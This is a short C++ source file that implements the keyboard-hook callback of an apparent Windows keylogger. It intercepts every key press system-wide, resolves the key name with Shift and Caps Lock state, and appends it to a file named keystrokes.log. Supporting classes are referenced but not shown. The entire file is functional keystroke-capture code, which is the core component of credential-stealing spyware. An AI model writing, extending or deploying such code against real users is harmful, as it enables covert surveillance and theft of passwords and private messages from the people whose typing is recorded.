#include "keyboardhook.hpp"

using namespace std;

Logger KeyboardHook::logger("keystrokes.log");

LRESULT CALLBACK KeyboardHook::keyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
        DWORD vkCode = kbdStruct->vkCode;
        DWORD scanCode = kbdStruct->scanCode;

        bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        bool capsLockToggled = GetKeyState(VK_CAPITAL) & 0x0001;

        string keyName = KeyMapper::getKeyName(vkCode, scanCode, shiftPressed, capsLockToggled);

        logger.log(keyName);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
